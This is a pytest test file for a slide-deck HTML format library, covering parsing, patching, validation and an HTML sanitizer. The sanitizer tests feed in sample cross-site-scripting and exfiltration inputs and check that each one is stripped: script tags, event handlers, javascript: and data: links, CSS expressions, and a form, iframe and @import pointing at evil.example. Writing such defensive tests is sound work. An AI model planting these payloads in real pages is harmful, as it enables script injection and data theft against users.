"""The canonical deck dialect — parse/serialize/patch/validate/sanitize.

Suffix-dispatch coverage (test 5) locks the six first-match-wins spots a
``.slides.html`` path must clear as a deck, not as a plain ``.html`` page or
a ``.slides.json`` deck, per the plan's "정본 덱 다이얼렉트" change unit.
"""

from __future__ import annotations

import pytest

from langchain_canvas.deck import (
    DECK_DIALECT_VERSION,
    Deck,
    DeckParseError,
    SlideTemplate,
    TextIntegrityError,
    ensure_text_equality,
    parse_deck,
    patch_slide,
    reorder_slides,
    sanitize_slide_html,
    serialize_deck,
    validate_deck,
)


def _slide(slide_id: str, text: str = "Hello", *, title: str | None = None) -> SlideTemplate:
    return SlideTemplate(
        slide_id=slide_id,
        title=title,
        style_css=".title { color: #111827; }",
        body_html=(
            f'<section class="slide"><p data-node-id="node-{slide_id}-1">{text}</p></section>'
        ),
    )


def test_parse_serialize_roundtrip_preserves_ids_order_text_source() -> None:
    deck = Deck(
        title="Quarterly Review",
        ratio="16:9",
        source="sources/deck.pptx",
        slides=[
            _slide("slide-001", "Intro", title="Cover"),
            _slide("slide-002", "Numbers"),
            _slide("slide-003", "Thanks"),
        ],
    )

    html = serialize_deck(deck)
    reparsed = parse_deck(html)

    assert reparsed == deck
    assert [s.slide_id for s in reparsed.slides] == ["slide-001", "slide-002", "slide-003"]
    assert reparsed.source == "sources/deck.pptx"
    assert f'data-lcx-dialect="{DECK_DIALECT_VERSION}"' in html

    # Round-tripping the already-canonical HTML a second time changes nothing.
    assert serialize_deck(parse_deck(html)) == html


def test_patch_slide_rewrites_only_target_even_with_duplicate_templates() -> None:
    duplicate_body = _slide("slide-001").body_html
    deck_html = serialize_deck(
        Deck(
            title="Deck",
            ratio="16:9",
            source=None,
            slides=[
                SlideTemplate("slide-001", None, "", duplicate_body),
                _slide("slide-002", "Middle"),
                SlideTemplate("slide-003", None, "", duplicate_body),
            ],
        )
    )

    new_template = (
        '<template data-slide-id="slide-002">'
        '<section class="slide"><p data-node-id="n1">Changed</p></section>'
        "</template>"
    )
    patched = patch_slide(deck_html, "slide-002", new_template)

    reparsed = parse_deck(patched)
    by_id = {s.slide_id: s for s in reparsed.slides}
    assert "Changed" in by_id["slide-002"].body_html
    # Both byte-identical siblings are untouched — matching was by id, not content.
    assert by_id["slide-001"].body_html == duplicate_body
    assert by_id["slide-003"].body_html == duplicate_body


def test_validate_rejects_duplicate_and_missing_ids() -> None:
    body_dup_node = (
        '<section class="slide"><p data-node-id="n1">A</p>'
        '<p data-node-id="n1">B</p></section>'
    )
    deck_html = serialize_deck(
        Deck(
            title="Deck",
            ratio="16:9",
            source=None,
            slides=[
                SlideTemplate("slide-001", None, "", body_dup_node),
                SlideTemplate("slide-001", None, "", "<section class=\"slide\"><p>x</p></section>"),
            ],
        )
    )

    issues = validate_deck(deck_html)
    codes = {issue.code for issue in issues}
    assert "duplicate-slide-id" in codes
    assert "duplicate-node-id" in codes


def test_ensure_text_equality_raises_on_mutation() -> None:
    slide_html = '<section class="slide"><p>Revenue grew 12%</p></section>'
    ensure_text_equality(["Revenue grew 12%"], slide_html)  # no raise

    import pytest

    with pytest.raises(TextIntegrityError):
        ensure_text_equality(["Revenue grew 30%"], slide_html)


def test_sanitize_preserves_table_rules_and_css_arrowheads() -> None:
    html = (
        '<section class="slide"><div style="box-sizing:border-box;'
        'border-top:1px solid black;border-left-color:red"></div>'
        '<div style="width:0;height:0;border-left:8px solid white;'
        'border-top:4px solid transparent;border-bottom:4px solid transparent"></div></section>'
    )
    clean = sanitize_slide_html(html).html
    assert "border-top: 1px solid black" in clean
    assert "border-left-color: red" in clean
    assert "border-left: 8px solid white" in clean
    assert "border-bottom: 4px solid transparent" in clean
    assert "box-sizing: border-box" in clean


def test_sanitize_strips_script_handler_form_external_url() -> None:
    dirty = (
        '<section class="slide" onclick="steal()">'
        "<script>alert(1)</script>"
        '<form action="https://evil.example/collect"><input></form>'
        '<iframe src="https://evil.example"></iframe>'
        '<img src="https://evil.example/x.png" onerror="alert(2)">'
        '<a href="javascript:alert(3)">click</a>'
        "</section>"
    )

    result = sanitize_slide_html(dirty)

    assert "<script" not in result.html
    assert "onclick" not in result.html
    assert "<form" not in result.html
    assert "<iframe" not in result.html
    assert "onerror" not in result.html
    assert "javascript:" not in result.html
    assert result.removed  # something was actually reported


def test_sanitize_keeps_allowlisted_layout_css() -> None:
    clean = (
        '<section class="slide">'
        '<div style="position: absolute; left: 10px; top: 20px; color: red; '
        'behavior: url(evil.htc)">'
        '<img src="assets/abc123.png" alt="pic">'
        "</div>"
        "</section>"
    )

    result = sanitize_slide_html(clean)

    assert "position: absolute" in result.html
    assert "left: 10px" in result.html
    assert "color: red" in result.html
    assert "behavior" not in result.html
    assert 'src="assets/abc123.png"' in result.html


def test_sanitize_strips_style_block_import_and_external_fetch() -> None:
    """@import (and the external URL it names) never survives <style> filtering.

    Layout props like position/z-index remain allowed inside <style> — the
    same allowlist already permits them on inline ``style=`` — but the
    external network fetch an @import performs must not.
    """
    dirty = (
        "<section>"
        "<style>*{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999} "
        "@import url(https://evil.example/x.css);</style>"
        "</section>"
    )

    result = sanitize_slide_html(dirty)

    assert "@import" not in result.html
    assert "evil.example" not in result.html


def test_sanitize_strips_css_url_with_disallowed_scheme() -> None:
    dirty = '<div style="background: url(https://evil.example/track.png)"></div>'

    result = sanitize_slide_html(dirty)

    assert "background" not in result.html
    assert "evil.example" not in result.html


def test_sanitize_keeps_css_url_pointing_at_local_assets() -> None:
    clean = '<div style="background: url(assets/ok.png)"></div>'

    result = sanitize_slide_html(clean)

    assert "background: url(assets/ok.png)" in result.html


def test_sanitize_strips_data_html_anchor_href() -> None:
    dirty = '<a href="data:text/html,<script>alert(1)</script>">click</a>'

    result = sanitize_slide_html(dirty)

    assert "data:text/html" not in result.html
    assert "<script" not in result.html


def test_sanitize_keeps_relative_asset_anchor_href() -> None:
    clean = '<a href="assets/x.png">download</a>'

    result = sanitize_slide_html(clean)

    assert 'href="assets/x.png"' in result.html


def test_sanitize_strips_css_expression_value() -> None:
    dirty = '<div style="width: expression(alert(1))"></div>'

    result = sanitize_slide_html(dirty)

    assert "expression" not in result.html
    assert "width" not in result.html


def test_suffix_dispatch_slides_html_wins_over_html() -> None:
    """The 6 first-match-wins dispatch points route ``.slides.html`` as a deck.

    Regression guard for CP-P1-007 / EP-P1-002: a `.slides.html` path must
    not silently fall through to the `.html` page/document handling in any
    of these spots, and the export-time asset-inlining arm must still hit
    the `.html` branch (assets are inlined the same way for both dialects;
    the deck-skin step is a separate later stage — see plan Change Unit 6).
    """
    from langchain_canvas import replay
    from langchain_canvas.deck import SLIDES_HTML_SUFFIX
    from langchain_canvas.exporters import _stem

    deck_html = serialize_deck(
        Deck(title="Deck", ratio="16:9", source=None, slides=[_slide("slide-001")])
    )
    path = "deck.slides.html"

    # 1) ARTIFACT_SUFFIXES / display_title — the deck suffix wins over ".html".
    assert SLIDES_HTML_SUFFIX in replay.ARTIFACT_SUFFIXES
    deck_suffix_index = replay.ARTIFACT_SUFFIXES.index(SLIDES_HTML_SUFFIX)
    assert deck_suffix_index < replay.ARTIFACT_SUFFIXES.index(".html")
    assert replay.display_title(path) == "deck"

    # 2) _replayable
    assert replay._replayable(path) is True

    # 3) events_for_commit
    events = replay.events_for_commit(
        path, deck_html, is_new=True, revision="rev-1", description="import"
    )
    create_event = events[0]
    assert create_event["artifact"]["type"] == "slides"
    assert create_event["artifact"]["data"] == {"html": deck_html}
    assert create_event["artifact"]["meta"]["kind"] == "deck"
    assert create_event["artifact"]["meta"]["ratio"] == "16:9"

    # 4) exporters.py::_stem
    assert _stem(path) == "deck"
    assert _stem("plain.html") == "plain"

    # 5 & 6) export-time asset inlining routes .slides.html to the .html arm
    # (inline_canvas_assets), not the .slides.json arm (inline_slides_assets)
    # — mirrors the `if/elif` ordering in tools.py::export_canvas.
    lowered = path.lower()
    assert lowered.endswith((".html", ".htm"))
    assert not lowered.endswith(".slides.json")


def _template_payload(slide_id: str = "slide-001") -> dict:
    return {
        "schema_version": 1,
        "template": {"path": "templates/h.template.json", "revision": "r7", "sha256": "abc123"},
        "instances": {
            slide_id: {
                "archetype_id": "body",
                "source_page": 7,
                "slot_content_sha256": "deadbeef",
                "request": {
                    "mode": "verbatim",
                    "locale": "ko",
                    "required_facts": [{"id": "f1", "text": "원래 요청 사실"}],
                    "input_slots": {"body": ["정확히 보존할 run"]},
                    "verbatim_expectations": {"body": ["정확히 보존할 run"]},
                },
                "fact_to_slot": {"f1": "body"},
            }
        },
    }


def test_template_metadata_roundtrip_and_legacy_default() -> None:
    payload = _template_payload()
    deck = Deck(
        title="Deck", ratio="16:9", source=None, slides=[_slide("slide-001")], template=payload
    )

    html = serialize_deck(deck)
    parsed = parse_deck(html)

    assert parsed.template == payload

    legacy_deck = Deck(title="Deck", ratio="16:9", source=None, slides=[_slide("slide-001")])
    legacy = parse_deck(serialize_deck(legacy_deck))
    assert legacy.template is None


def test_patch_and_reorder_preserve_template_metadata() -> None:
    payload = _template_payload()
    deck = Deck(
        title="Deck",
        ratio="16:9",
        source=None,
        slides=[_slide("slide-001"), _slide("slide-002")],
        template=payload,
    )
    html = serialize_deck(deck)

    patched = patch_slide(
        html,
        "slide-002",
        '<template data-slide-id="slide-002">'
        '<section class="slide"><p data-node-id="n">Changed</p></section>'
        "</template>",
    )
    assert parse_deck(patched).template == payload

    reordered = reorder_slides(html, ["slide-002", "slide-001"])
    assert parse_deck(reordered).template == payload
    assert [s.slide_id for s in parse_deck(reordered).slides] == ["slide-002", "slide-001"]


def test_bad_or_oversized_template_metadata_rejected() -> None:
    base = serialize_deck(
        Deck(title="Deck", ratio="16:9", source=None, slides=[_slide("slide-001")])
    )
    duplicated = base.replace(
        "</head>",
        '<meta name="lcx:template" content="{}"><meta name="lcx:template" content="{}"></head>',
    )
    with pytest.raises(DeckParseError):
        parse_deck(duplicated)

    bad_json = base.replace(
        "</head>", '<meta name="lcx:template" content="not-json"></head>'
    )
    with pytest.raises(DeckParseError):
        parse_deck(bad_json)

    oversized_payload = {
        "schema_version": 1,
        "template": {"path": "p", "revision": "r", "sha256": "s" * 300000},
        "instances": {},
    }
    with pytest.raises(DeckParseError):
        serialize_deck(
            Deck(
                title="Deck",
                ratio="16:9",
                source=None,
                slides=[_slide("slide-001")],
                template=oversized_payload,
            )
        )
